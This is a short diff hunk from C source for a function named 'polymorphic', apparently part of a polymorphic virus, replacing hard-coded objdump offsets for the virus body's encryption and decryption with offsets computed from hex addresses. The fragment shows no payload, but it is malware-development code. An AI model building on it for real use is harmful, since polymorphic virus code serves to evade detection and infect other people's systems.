@@ -25,10 +25,39 @@ int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encry
 	srand(time(NULL));
 
 
-	/* Append these values from manual input via objdump*/
-	virus_instruction_begin = 4656;
-	virus_encrypt_size = 2608;
-	virus_decrypt_offset = 7502;
+
+
+	unsigned long full_addr_enc_begin = virus_instruction_begin;
+
+	// to get offset just delete the most significant char
+	char buffer1[15];
+	sprintf(buffer1, "%06lx", (unsigned long)virus_instruction_begin);
+	char *main_offset = buffer1;
+	// write(1, main_offset, strlen(main_offset));
+	main_offset = main_offset + 1;
+	// write(1, main_offset, strlen(main_offset));
+	printf("\n");
+
+	char buffer3[15];
+	sprintf(buffer3, "%06lx", (unsigned long)virus_decrypt_offset);
+	char *decryption_offset = buffer3;
+	decryption_offset = decryption_offset + 1;
+	// write(1, decryption_offset, strlen(decryption_offset));
+
+	// printf("\n");
+
+
+      virus_instruction_begin  = (int)strtol(main_offset, NULL, 16);
+	virus_decrypt_offset  = (int)strtol(decryption_offset, NULL, 16);
+
+      printf("%ul\n", virus_instruction_begin);
+      printf("%ul\n", virus_decrypt_offset);
+
+
+	// /* Append these values from manual input via objdump*/
+	// virus_instruction_begin = 4656;
+	// virus_encrypt_size = 2608;
+	// virus_decrypt_offset = 7502;
 
 
 	FILE *f = fopen(filename, "rb");
